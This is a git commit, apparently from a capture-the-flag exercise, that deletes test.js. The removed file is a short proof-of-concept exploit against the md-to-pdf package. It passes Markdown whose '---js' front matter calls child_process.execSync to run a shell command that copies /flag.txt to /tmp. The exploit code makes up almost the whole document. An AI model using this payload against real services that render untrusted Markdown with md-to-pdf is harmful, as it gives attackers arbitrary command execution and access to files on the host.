6cd2cfc8d42d846767679d716c080194be52fcc1
0xETX <dibart3@gmail.com>
2022-05-16 23:50:26 -0400

    Delete test.js

--- test.js
+++
@@ -1,7 +0,0 @@
-const { mdToPdf } = require('md-to-pdf');
-
-var payload = '---js\n((require("child_process")).execSync("cat /flag.txt > /tmp/RCE.txt"))\n---RCE';
-
-(async () => {
-    await mdToPdf({ content: payload }, { dest: './output.pdf' });
-})();
